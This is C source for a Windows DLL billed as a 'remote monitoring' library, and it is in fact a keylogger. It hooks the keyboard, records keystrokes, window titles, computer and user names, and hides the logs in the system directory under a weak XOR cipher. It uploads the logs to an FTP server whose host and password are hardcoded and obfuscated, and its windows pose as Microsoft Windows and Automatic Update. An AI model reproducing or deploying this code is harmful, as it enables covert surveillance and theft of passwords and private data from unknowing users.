
// Library for Remote Controlled Monitoring & Administration
// of Windows based computers. Program written by Arjun Menon

#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

/*********************.
| Function Prototypes |
`*********************/

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
__declspec(dllexport) void AutomaticUpdate
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
BOOL APIENTRY DllMain(HINSTANCE hModule, 
DWORD reason_for_call, LPVOID reserved);

/* System Monitoring */
void WINAPI StartSystem(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK MonWP (HWND hwnd, UINT message,
WPARAM wParam,LPARAM lParam);
void StartSensing();
inline HANDLE TargetFile();
char * BaseDirectory();
void WriteInformation(char *str);
inline void WriteToFile(char *str);
void InvertArray(char *X, 
const unsigned long int N);
void XorArray(char *str, 
const unsigned long int n, const char *key);
LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam);
void CALLBACK WindowTimer (HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
void CALLBACK TimeStamp (HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
void TimeAndDate(char *str);
void DescribeKey(WPARAM wParam, char *keyw);

/* Remote Information Storage */
DWORD WINAPI StartUpdate(PVOID pParam);
void WINAPI UpdateProc(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK UpdWP (HWND hwnd, UINT message,
WPARAM wParam,LPARAM lParam);
void CALLBACK UpdateTimer (HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
inline unsigned long int LogLimit();
inline char UploadLog(unsigned long int no);
inline unsigned long int GetCompId(HINTERNET hFtp);

/* Common Application Services */
HWND MakeSillyWindow(HINSTANCE hInstance, 
WNDPROC WndProc, LPCTSTR WndName);
void RunProcess(char *ProcessName);
void MakeProperString(char *String);

/* Information File Reader */
int WINAPI InfoFileReader(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
char * Unleash(char *buff, unsigned long int len, 
			unsigned long int *newlen);

/********************************.
| Global Variables and Constants |
`********************************/

#define STR_SZ1 64
#define STR_SZ2 512
#define MAX_FSZ 1024

const char AppName[] = "Microsoft® Windows® Operating System";
const char AppName2[] = "Microsoft® Windows® Automatic Update";
char Password[] = "a";

HANDLE hDLL = NULL;
HHOOK KeyHook = NULL;

#define WINDOW_TIMER  100
#define TIME_STAMP    60000
#define UPDATE_TIMER  3000

char LocLogFileExt[] = "$_dl";
char LogCountFile[] = "Wffc]cj$ioi";
char SrvLogFileExt[] = "$]_\\";
char UplinkCountFile[] = "k_Yeh[)($ioi";
char LocIdFile[] = "Yihii$ioi";
char SrvIdFile[] = "Yekdj$]_\\";
char InternetCheckMask[] = "^jjf0%%mmm$c_Yheie\\j$Yec";
char FtpServer[] = "mmm$_dj[hb_da$\'+&c$Yec";
char FtpUserName[] = "_dj[hb_da$\'+&c$Yec";
char FtpPassword[] = "^WYacoYecfkj[h";

inline void RectifyStrings()
{
	MakeProperString(LocLogFileExt);
	MakeProperString(LogCountFile);
	MakeProperString(SrvLogFileExt);
	MakeProperString(UplinkCountFile);
	MakeProperString(LocIdFile);
	MakeProperString(SrvIdFile);
	MakeProperString(InternetCheckMask);
	MakeProperString(FtpServer);
	MakeProperString(FtpUserName);
	MakeProperString(FtpPassword);
}

/****************************.
| Exported DLL Entry Points |
`***************************/

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	StartSystem((HINSTANCE)hDLL, NULL, lpszCmdLine, SW_NORMAL);
}

__declspec(dllexport) void InfoFileRead
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	InfoFileReader((HINSTANCE)hDLL, NULL, lpszCmdLine, SW_NORMAL);
}

BOOL APIENTRY DllMain
(HINSTANCE hModule, DWORD reason_for_call, LPVOID reserved)
{
	hDLL = hModule;

	return TRUE;
}

/***************************.
| System Monitoring Program |
`***************************/

void WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
	RectifyStrings();

	HWND hWnd = MakeSillyWindow
		(hInstance,MonWP,AppName);
	ShowWindow(hWnd, nCmdShow);
	 
	MSG msg; /* the message catcher... */
	while (GetMessage (&msg, NULL, 0, 0))
	{
		TranslateMessage (&msg);
		DispatchMessage (&msg);
	}
}

LRESULT CALLBACK MonWP (HWND hWnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		TimeStamp(NULL,0,0,0);
		SetTimer(hWnd, 1, WINDOW_TIMER, WindowTimer);
		SetTimer(hWnd, 2, TIME_STAMP, TimeStamp);
		StartSensing();
		break;
	case WM_CLOSE:
		KillTimer (hWnd, 1);
		KillTimer (hWnd, 2);
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0);
		return 0;
	}
	return DefWindowProc (hWnd, message, wParam, lParam) ;
}

void StartSensing()
{
	/* start the keylogger */
	KeyHook = SetWindowsHookEx(WH_KEYBOARD,
	(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,(DWORD)NULL);
	/* start the update */
	DWORD UpdId = 0;
	CreateThread(NULL,0,StartUpdate,NULL,0,&UpdId);
}

void WriteInformation(char *str)
{
	static BOOL write_semaphore = FALSE;

	if(!str) 
		goto exit_point;
	if(write_semaphore == TRUE) {
		/* wait for pending write to complete */
		while(write_semaphore);
	} else
		write_semaphore = TRUE;

	WriteToFile(str);

exit_point:
	write_semaphore = FALSE;
}

char * BaseDirectory()
{
	static char *BaseDir = NULL;

	/* not known? */
	if(!BaseDir) {
		// this code is executed ONLY ONCE
		auto char temp[STR_SZ1];
		GetSystemDirectory(temp,STR_SZ1);
		strcat(temp,"\\srvdat\\");
		CreateDirectory(temp,NULL);

		/* copy temp to BaseDir */
		BaseDir = (char *) calloc
			(strlen(temp)+1,1);
		strcpy(BaseDir,temp);
	}

	return BaseDir;
}

inline HANDLE TargetFile()
{
	static char TargetFileName[STR_SZ1];
	static unsigned long int FileCount = 1;
	static FILE *CounterFileHandle = NULL;

	if(CounterFileHandle == NULL) {
		// this code is executed ONLY ONCE
		auto char temp[STR_SZ2];
		sprintf(temp,"%s%s",BaseDirectory(),LogCountFile);
		CounterFileHandle = fopen(temp,"r+b");
		if(CounterFileHandle == NULL) {
			CounterFileHandle = fopen(temp,"w+b");
			fwrite(&FileCount, sizeof(unsigned long int), 
				1, CounterFileHandle);
		} else
			fread(&FileCount,sizeof(unsigned long int), 
				1, CounterFileHandle);
		rewind(CounterFileHandle);
	}
	sprintf(TargetFileName,"%s%lX%s",BaseDirectory(),FileCount,LocLogFileExt);

	/* grasp the file & its size*/
	HANDLE hFile = CreateFile(TargetFileName, GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE) return hFile;
	DWORD FileSize = GetFileSize(hFile, NULL);
	if(FileSize == INVALID_FILE_SIZE) return hFile;

	if(FileSize > MAX_FSZ) {
		FileCount++;
		fwrite(&FileCount,sizeof(unsigned long int), 
			1, CounterFileHandle);
		rewind(CounterFileHandle);
	}
	return hFile;
}

inline void WriteToFile(char *str)
{
	HANDLE hFile;
	DWORD  nFile;

	if((hFile = TargetFile()) ==
	INVALID_HANDLE_VALUE) return;

	InvertArray(str,strlen(str));
	XorArray(str,strlen(str),Password);
	SetFilePointer(hFile, 0, NULL, FILE_END);
	WriteFile(hFile, str, strlen(str), &nFile, NULL);
	CloseHandle(hFile);
}

void InvertArray(char *X, const unsigned long int N)
{
	register unsigned int i = 0;
	for(;i<N;i++) X[i] = ~X[i];
}

void XorArray(char *str, const unsigned long int n, 
			  const char *key)
{
	const int keylen = strlen(key);
	register unsigned int i = 0;
	for(;i<n;i++) /* XOR encryption */
		str[i] = str[i] ^ key[i%keylen];
}

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	/* The 32nd bit of lParam tells us if 
	   the key is being pressed or released */
	if(!(lParam >> 31))
	{
		char *keyw = (char *)calloc(STR_SZ1, sizeof(char));
		DescribeKey(wParam, keyw);

		/* The first 16 bits of lParam tells
		   us how long the key was pressed */
		UINT repeat = (lParam << 16) >> 16;
		if(!repeat) repeat = 1;
		char *key = (char *) calloc
		((repeat * strlen(keyw))+1, sizeof(char));
		if(key == NULL)
			goto exit_point;
		while(repeat--)
			strcat(key, keyw);

		if(key)
			WriteInformation(key);
	exit_point:
		free(keyw);
		free(key);
	}
	return CallNextHookEx(KeyHook, code, wParam, lParam);
}

void CALLBACK WindowTimer (HWND hwnd, 
                           UINT message, 
                           UINT iTimerID, 
                           DWORD dwTime)
{
	static HWND ForegroundWindow = NULL;
	static char *PreviousWindowName = NULL;
	BOOL has_changed = FALSE;

	if(GetForegroundWindow() != ForegroundWindow) {
		has_changed = TRUE;
		ForegroundWindow = GetForegroundWindow();
	}

	/* get WindowName */
	int size = GetWindowTextLength(ForegroundWindow)+1;
	char *WindowName = (char *)calloc(size,sizeof(char));
	size = GetWindowText(ForegroundWindow, WindowName, size);

	if(PreviousWindowName != NULL && WindowName != NULL) {
		if(strcmp(PreviousWindowName, WindowName))
			has_changed = TRUE;
	} else  has_changed = TRUE;

	if(has_changed)
	{
		if(PreviousWindowName)
			free(PreviousWindowName);
		if(WindowName) {
			if(strlen(WindowName)) {
				char *str = (char *)calloc
				((size+STR_SZ1)+STR_SZ2,sizeof(char));
				sprintf(str,"\n\r%s\n",WindowName);
				WriteInformation(str);
				free(str);
			}
		}
	}
	PreviousWindowName = WindowName;
}

void CALLBACK TimeStamp(HWND hwnd, 
                        UINT message, 
                        UINT iTimerID, 
                        DWORD dwTime)
{
	char *str = (char *)calloc(STR_SZ2+20,1),
	     *sub = (char *)calloc(STR_SZ2,1);
	static char brrr = 0;
	if(!(brrr%17)) {
		brrr++;
		// every 17 seconds do this....
		unsigned long int bsize = STR_SZ2;
		if( !GetComputerName(sub,&bsize) ) {
			sub = (char *) realloc (sub, bsize);
			GetComputerName(sub,&bsize);
		}
		sprintf(str," # Computer Name: %s\r\n",sub);
		WriteInformation(str);
		if( !GetUserName(sub,&bsize) ) {
			sub = (char *) realloc (sub, bsize);
			GetUserName(sub,&bsize);
		}
		sprintf(str," # User Name: %s\r\n",sub);
		WriteInformation(str);

		OSVERSIONINFO ya;
		ya.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if( GetVersionEx(&ya) ) {
			sprintf(str," # Version %u.%u Build %u ",
				ya.dwMajorVersion,
				ya.dwMinorVersion,
				ya.dwBuildNumber);
			if(ya.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
				strcat(str,"Windows 9x ");
			else if(ya.dwPlatformId == VER_PLATFORM_WIN32_NT)
				strcat(str,"Windows NT ");
			strcat(str,ya.szCSDVersion);
			WriteInformation(str);
		}
	}
	TimeAndDate(sub);
	sprintf(str,"\n\rTime %s\n",sub);
	WriteInformation(str);
	free(sub);
	free(str);
}

void TimeAndDate(char *str)
{
	TIME_ZONE_INFORMATION here;
	SYSTEMTIME utc, local;
	GetTimeZoneInformation(&here);
	GetLocalTime(&local);
	GetSystemTime(&utc);

	char AM_PM[3];
	if(local.wHour>12) {
		strcpy(AM_PM,"PM");
		local.wHour -= 12;
	} else strcpy(AM_PM,"AM");

	sprintf(str,
	"%u/%u/%u %u:%u:%u %s (%uH%uM GMT)",
	local.wDay,
	local.wMonth,
	local.wYear,
	local.wHour,
	local.wMinute,
	local.wSecond,
	AM_PM,
	utc.wHour,
	utc.wMinute
	);
}

void DescribeKey(WPARAM wParam, char *keyw)
{
	char vkc = 0; /* virtual key code */

	vkc = /* maintain alphabet case */
		((GetKeyState(VK_SHIFT) < 0)&&(
		!(GetKeyState(VK_CAPITAL) < 0)))
		? toupper((char)(wParam))
		: tolower((char)(wParam));

	/* numeric pad keys 0 to 10 */
	if((wParam >= VK_NUMPAD0)&&
	   (wParam <= VK_NUMPAD9))
		sprintf(keyw,"[NumPad:%u]",
		(wParam - VK_NUMPAD0));

	/* keys from 0 to 9 , A to Z and space */
	else if(((wParam >= 0x30) 
	       &&(wParam <= 0x5A)) 
	       ||(wParam == 0x20))
	{
		keyw[0] = vkc;
		keyw[1] = 0;
	}

	else switch(wParam)
	{
		case VK_CANCEL:    strcpy(keyw,"[CTRL-BRK]"); break;
		case VK_BACK:      strcpy(keyw,"[BACK]"); break;
		case VK_TAB:       strcpy(keyw,"[TAB]"); break;
		case VK_CLEAR:     strcpy(keyw,"[CLEAR]"); break;
		case VK_RETURN:    strcpy(keyw,"[ENTER]\r\n"); break;
		case VK_SHIFT:     strcpy(keyw,"[SHIFT]"); break;
		case VK_CONTROL:   strcpy(keyw,"[CTRL]"); break;
		case VK_MENU:      strcpy(keyw,"[ALT]"); break;
		case VK_PAUSE:     strcpy(keyw,"[PAUSE]"); break;
		case VK_CAPITAL:   strcpy(keyw,"[CapsLock]"); break;
		case VK_ESCAPE:    strcpy(keyw,"[ESC]"); break;
		case VK_PRIOR:     strcpy(keyw,"[PageUp]"); break;
		case VK_NEXT:      strcpy(keyw,"[PageDown]"); break;
		case VK_END:       strcpy(keyw,"[END]"); break;
		case VK_HOME:      strcpy(keyw,"[HOME]"); break;
		case VK_LEFT:      strcpy(keyw,"[LEFT]"); break;
		case VK_UP:        strcpy(keyw,"[UP]"); break;
		case VK_RIGHT:     strcpy(keyw,"[RIGHT]"); break;
		case VK_DOWN:      strcpy(keyw,"[DOWN]"); break;
		case VK_SELECT:    strcpy(keyw,"[SELECT]"); break;
		case VK_EXECUTE:   strcpy(keyw,"[EXECUTE]"); break;
		case VK_SNAPSHOT:  strcpy(keyw,"[PrintScreen]"); break;
		case VK_INSERT:    strcpy(keyw,"[INSERT]"); break;
		case VK_DELETE:    strcpy(keyw,"[DELETE]"); break;
		case VK_HELP:      strcpy(keyw,"[HELP]"); break;
		case VK_LWIN:      strcpy(keyw,"[LeftWindowsKey]"); break;
		case VK_RWIN:      strcpy(keyw,"[RightWindowsKey]"); break;
		case VK_APPS:      strcpy(keyw,"[ApplicationKey]"); break;
		case VK_MULTIPLY:  strcpy(keyw,"[MULTIPLY]"); break;
		case VK_ADD:       strcpy(keyw,"[ADD]"); break;
		case VK_SEPARATOR: strcpy(keyw,"[SEPERATOR]"); break;
		case VK_SUBTRACT:  strcpy(keyw,"[SUBTRACT]"); break;
		case VK_DECIMAL:   strcpy(keyw,"[DECIMAL]"); break;
		case VK_DIVIDE:    strcpy(keyw,"[DIVIDE]"); break;
		case VK_F1:        strcpy(keyw,"[F1]"); break;
		case VK_F2:        strcpy(keyw,"[F2]"); break;
		case VK_F3:        strcpy(keyw,"[F3]"); break;
		case VK_F4:        strcpy(keyw,"[F4]"); break;
		case VK_F5:        strcpy(keyw,"[F5]"); break;
		case VK_F6:        strcpy(keyw,"[F6]"); break;
		case VK_F7:        strcpy(keyw,"[F7]"); break;
		case VK_F8:        strcpy(keyw,"[F8]"); break;
		case VK_F9:        strcpy(keyw,"[F9]"); break;
		case VK_F10:       strcpy(keyw,"[F10]"); break;
		case VK_F11:       strcpy(keyw,"[F11]"); break;
		case VK_F12:       strcpy(keyw,"[F12]"); break;
		case VK_F13:       strcpy(keyw,"[F13]"); break;
		case VK_F14:       strcpy(keyw,"[F14]"); break;
		case VK_F15:       strcpy(keyw,"[F15]"); break;
		case VK_F16:       strcpy(keyw,"[F16]"); break;
		case VK_NUMLOCK:   strcpy(keyw,"[NumLock]"); break;
		case VK_SCROLL:    strcpy(keyw,"[ScrollLock]"); break;
		case VK_ATTN:      strcpy(keyw,"[ATTN]"); break;
		case VK_CRSEL:     strcpy(keyw,"[CrSel]"); break;
		case VK_EXSEL:     strcpy(keyw,"[ExSel]"); break;
		case VK_EREOF:     strcpy(keyw,"[EraseEOF]"); break;
		case VK_PLAY:      strcpy(keyw,"[PLAY]"); break;
		case VK_ZOOM:      strcpy(keyw,"[ZOOM]"); break;
		default:
			sprintf(keyw,"[(%d)%c]",wParam,wParam);
			break;
	}
}

/************************************.
| Remote Information Storage Program |
`************************************/

DWORD WINAPI StartUpdate(PVOID pParam)
{
	UpdateProc((HINSTANCE)hDLL, NULL, NULL, SW_NORMAL);
	return 0;
}

void WINAPI UpdateProc(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND hWnd = MakeSillyWindow
		 (hInstance,UpdWP,AppName2);
	 ShowWindow(hWnd, nCmdShow);
	 
	 MSG msg; /* the message catcher... */
     while (GetMessage (&msg, NULL, 0, 0))
	 {
          TranslateMessage (&msg);
          DispatchMessage (&msg);
     }
}

LRESULT CALLBACK UpdWP (HWND hWnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		SetTimer(hWnd, 1, UPDATE_TIMER, UpdateTimer);
		break;
	case WM_CLOSE:
		KillTimer (hWnd, 1);
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0);
		return 0;
	}
	return DefWindowProc (hWnd, message, wParam, lParam) ;
}

void CALLBACK UpdateTimer(HWND hwnd, 
                          UINT message, 
                          UINT iTimerID, 
                          DWORD dwTime)
{
	static BOOL semaphore = FALSE;
	if(semaphore == TRUE)
		return;
	else
		semaphore = TRUE;

	static FILE *uf = NULL;
	if(uf == NULL) {
		char fname[STR_SZ1];
		sprintf(fname,"%s%s",BaseDirectory(),UplinkCountFile);
		uf = fopen(fname,"r+b");
		if(uf == NULL) {
			uf = fopen(fname,"w+b");
			if(uf == NULL) {
				semaphore = FALSE;
				return;
			}
			unsigned long int one = 1;
			fwrite(&one, sizeof(unsigned long int), 1, uf);
			rewind(uf);
		}
	}
	unsigned long int limit = LogLimit();
	unsigned long int current = 0;
	fread(&current, sizeof(unsigned long int), 1, uf);
	rewind(uf);
	if(current <= limit) {
		if( UploadLog(current) ) {
			// file was uploaded successfully
			current++;
			fwrite(&current, sizeof(unsigned long int), 1, uf);
			rewind(uf);
		}
	}
	semaphore = FALSE;
}

inline unsigned long int LogLimit()
{
	unsigned long int limit = 0;
	FILE *cf = NULL;
	auto char cfname[STR_SZ2];
	sprintf(cfname,"%s%s",BaseDirectory(),LogCountFile);
	cf = fopen(cfname,"r+b");
	if(cf != NULL) {
		fread(&limit, sizeof(unsigned long int), 1, cf);
		fclose(cf);
	}
	return limit;
}

inline char UploadLog(unsigned long int no)
{
	/* this function will transfer the log 
	   files one by one to the FTP server */

	static BOOL semaphore = FALSE;
	if(semaphore == TRUE)
		return 0;
	else
		semaphore = TRUE;

	if(InternetCheckConnection(InternetCheckMask,FLAG_ICC_FORCE_CONNECTION,0))
	{
		/* connect me to the internet */
		HINTERNET hNet = InternetOpen(AppName2, PRE_CONFIG_INTERNET_ACCESS,
			NULL, INTERNET_INVALID_PORT_NUMBER, 0 );
		if(hNet != NULL)
		{
			/* connect me to the remote FTP Server */
			HINTERNET hFtp = InternetConnect(hNet,FtpServer,
				INTERNET_DEFAULT_FTP_PORT,FtpUserName,FtpPassword,
				INTERNET_SERVICE_FTP, 0, 0);
			if(hFtp != NULL)
			{
				/* successful connection to FTP server established */
				char local_file[STR_SZ1], remote_file[STR_SZ1];
				sprintf(local_file,"%s%lX%s",BaseDirectory(),no,LocLogFileExt);
				sprintf(remote_file,"%lu-%lX%s",GetCompId(hFtp),no,SrvLogFileExt);
				if(FtpPutFile(hFtp, local_file, remote_file, 0, 0))
				{
					/* file transfer OK */
					InternetCloseHandle(hNet);
					InternetCloseHandle(hFtp);
					semaphore = FALSE;
					return 1;
				}
				else {
					/* file transfer failed */
					InternetCloseHandle(hNet);
					InternetCloseHandle(hFtp);
					semaphore = FALSE;
					return 0;
				}
			}
			else {
				/* connection to FTP server failed */
				InternetCloseHandle(hNet);
				semaphore = FALSE;
				return 0;
			}
		}
		else {
			/* connection to internet failed */
			semaphore = FALSE;
			return 0;
		}
	}
	/* internet connection is not available 
	   either because the person is not online
	   or because a firewall has blocked me */
	semaphore = FALSE;
	return 0;
}

inline unsigned long int GetCompId(HINTERNET hFtp)
{
	unsigned long int cid = 0;
	char retrieve_id = 0;

	char idf_name[STR_SZ1];
	sprintf("%s%s",BaseDirectory(),LocIdFile);
	FILE *idf = NULL;

	if((idf = fopen(idf_name,"r+b")) != NULL)
	{
		if(fread(&cid,sizeof(unsigned long int),1,idf)
			== sizeof(unsigned long int))
		{
			// Got the ID number
			fclose(idf);
			return cid;
		}
		else
			retrieve_id = 1;
	}
	else
		retrieve_id = 1;

	fclose(idf);

	/* this a new computer, so
	   we have to make a new
	   ID number for it. */
	if(retrieve_id)
	{
		/* this code is executed ONLY ONCE
		   after the installion / first run. */
		if(FtpGetFile(hFtp, SrvIdFile, idf_name, FALSE, 
			NULL, FTP_TRANSFER_TYPE_BINARY, 0))
		{
			//
		}
		else
		{
			//
		}
		/* now that the remote ID file has been setup,
		   let's update the local ID file with it. */
		FtpGetFile(hFtp, SrvIdFile, idf_name, FALSE, 
			NULL, FTP_TRANSFER_TYPE_BINARY, 0);
	}

	return cid;
}

/*****************************.
| Common Application Services |
`*****************************/

HWND MakeSillyWindow(HINSTANCE hInstance, 
				WNDPROC WndProc, LPCTSTR WndName)
{
     WNDCLASS    wndclass ;

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc;
     wndclass.cbClsExtra    = 0;
     wndclass.cbWndExtra    = 0;
     wndclass.hInstance     = hInstance;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO);
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW);
     wndclass.hbrBackground = (HBRUSH) COLOR_BTNFACE;
     wndclass.lpszMenuName  = NULL;
     wndclass.lpszClassName = WndName;

     if (!RegisterClass (&wndclass))
          return NULL ;

     return CreateWindow (WndName, WndName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;
}

void RunProcess(char *ProcessName)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    CreateProcess( NULL, ProcessName, NULL, 
		NULL, FALSE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}

void MakeProperString(char *String)
{
	register unsigned int i = 0;
	for(; i < strlen(String) ; i++)
		String[i] += 10;
}

/*************************.
| Information File Reader |
`*************************/

int WINAPI InfoFileReader(HINSTANCE hInstance, 
						  HINSTANCE hPrevInstance, 
						  LPSTR lpCmdLine, int nShowCmd)
{
	HANDLE hFile  = CreateFile(lpCmdLine, GENERIC_READ,
	0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return 0;


	const int buff_size = 4096;
	char FileName[255];
    if(!GetTempPath(255,FileName))
		strcpy(FileName,"C:\\");
    strcat(FileName,"Inverted");
	DeleteFile(FileName);
    
	char ProcessName[300];
	strcpy(ProcessName,"notepad ");
	strcat(ProcessName,FileName);
 
	unsigned long int  BytesRead, 
	BytesToWrite, BytesWritten, Pos; 
	char buff[buff_size], *wdata;

	HANDLE hWrite = CreateFile(FileName, GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hWrite == INVALID_HANDLE_VALUE) return 0;

	do 
	{ 
		if (ReadFile(hFile, buff, buff_size, &BytesRead, NULL)) 
		{ 
			Pos = SetFilePointer(hWrite, 0, NULL, FILE_END); 
			LockFile(hWrite, Pos, 0, Pos + BytesRead, 0);
			wdata = Unleash(buff, BytesRead, &BytesToWrite);
			WriteFile(hWrite, wdata, BytesToWrite, 
				&BytesWritten, NULL);
			free(wdata);
			UnlockFile(hWrite, Pos, 0, Pos + BytesRead, 0); 
		} 
	}	while (BytesRead == buff_size); 

	CloseHandle(hFile);
	CloseHandle(hWrite);

	void RunProcess(char *ProcessName);
	RunProcess(ProcessName);

	DeleteFile(FileName);

	return 0;
}

char * Unleash(char *buff, unsigned long int len,
			 unsigned long int *newlen)
{
	char *data = (char *)calloc((strlen(buff)+1)*2,1), *dp;
	XorArray(buff,strlen(buff),Password);
	InvertArray(buff, len);

	register unsigned long int i;
	for(*newlen=0, dp=data, i=0; i<len; i++)
	{
		if(buff[i]=='\n'&&buff[i-1]!='\r')
		{
			if(buff[i+1]=='\r') {
				i++;
				strcat(dp,"\r\n<<");
				dp+=4;
				(*newlen)+=4;
			}
			else if(buff[i+1]=='\n') {
				strcat(dp,">>");
				dp+=2;
				(*newlen)+=2;
			}
			else {
				strcat(dp,">>\r\n");
				dp+=4;
				(*newlen)+=4;
			}
		}
		else
		{
			*dp++ = buff[i];
			(*newlen)++;
		}
	}
	return data;
}
